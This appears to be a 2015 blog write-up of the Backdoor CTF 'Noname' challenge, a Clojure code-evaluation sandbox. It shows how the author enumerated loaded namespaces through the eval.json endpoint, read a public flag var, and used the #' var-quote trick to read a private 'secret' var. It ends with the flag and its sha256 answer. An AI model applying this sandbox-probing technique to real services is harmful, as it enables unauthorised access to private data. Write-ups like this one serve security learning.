---
layout: post
title: "Backdoor CTF 2015 - Noname Writeup"
date: 2015-04-03 00:42:36 +0430
comments: false
categories: ctf, clojure, sandbox
---


**Backdoor2015 NONAME Writeup**  
**Point = 200**  
**Category = Exploit**  
**Description : **  

> Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can't get the flag. Can you? Visit [this](https://agile-garden-1672.herokuapp.com/). Submit the SHA-256 hash of the flag obtained. 
> 
> Welcome to Noname! You can see an intrepreter above
Get admin's flag and admin's secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined
Get admin's flag and admin's secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined

We could see  see an intrepreter like this : 

<!-- more -->

![enter image description here](http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png)
so first for testing script give "1" as input it will retrun "1" again ..
lets check whats going on in browser run firebug and check : 

![enter image description here](http://up.ashiyane.org/images/2fmqsv03ko2qatsw10tq.png)

Its using JSON with eval.json at this [LINK](https://agile-garden-1672.herokuapp.com/eval.json?expr=1) .
Lets see whats happen if we execute our codes directly : 
[https://agile-garden-1672.herokuapp.com/eval.json?expr=*](https://agile-garden-1672.herokuapp.com/eval.json?expr=*)
And the response : 

>    {"expr":"*","result":"#<core$_STAR_ clojure.core$_STAR_@5ca69ca5>"}
 cool , Its Clojure and * is built-in function in "clojure.core"
 lets google clojure.core and find all functions of this library :
[http://clojure.github.io/clojure/clojure.core-api.html](http://clojure.github.io/clojure/clojure.core-api.html)
this link has all built-in functions of this library . after little searching found (loaded-libs) function .
more googling about clojure i understood that for using function out syntax shoud be like 
(function) . for loaded-libs it should be (loaded-libs) and response : 

>    {"expr":"(loaded-libs)","result":"#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}"}

Found good things : 

    noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home


specialy "noname.people.admin" because of hint of question: 

> Remember admin is one of the people

Its loaded , so we can use it in our codes but we dont know functions and classes
little googling found "clojure.repl/dir" it can list classes , functions ... : 
[https://agile-garden-1672.herokuapp.com/eval.json?expr=(clojure.repl/dir noname.people.admin)](https://agile-garden-1672.herokuapp.com/eval.json?expr=%28clojure.repl/dir%20noname.people.admin%29)

and response :

>    {"expr":"(clojure.repl/dir noname.people.admin)","result":"flag\nnil"}

oh . "flag" .... lets check if its public : 
[https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29](https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29)

 yes , its public , we can use it in interpreter : 
![enter image description here](http://up.ashiyane.org/images/b95z537owt2a0cmrm1ca.png)
 
 got second part of flag : 
 

    Give me some code:
> (noname.people.admin/flag)
> Ma flag is : _b7w_1_l1k3_60l4n6_700nil
>  

We need first part of flag called admin's secret , let test  (noname.people.admin/secret)
and response id error : 

>    {"error":true,"message":"java.lang.IllegalStateException: var: noname.people.admin/secret is not public"}

it private , and because of namespace we cant use it also we cant switch our namespace becuase "ns" is closed by Java.Security...

lets google and find a way for bypass :)
found this http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions

awesome :D

do what it said :  
![enter image description here](http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png)

and its the first part of the flag :

> (#'noname.people.admin/secret)
> "Ma secret is: 1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk"
> 
> Flag Format = sha256(secret+flag)
> sha256(1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk_b7w_1_l1k3_60l4n6_700)
> **147fadb708195779c6414a0ce9171bc4b966e03a9818383eabafa0e71a240d5a**

200 points ;)

WriteUp By PARSA
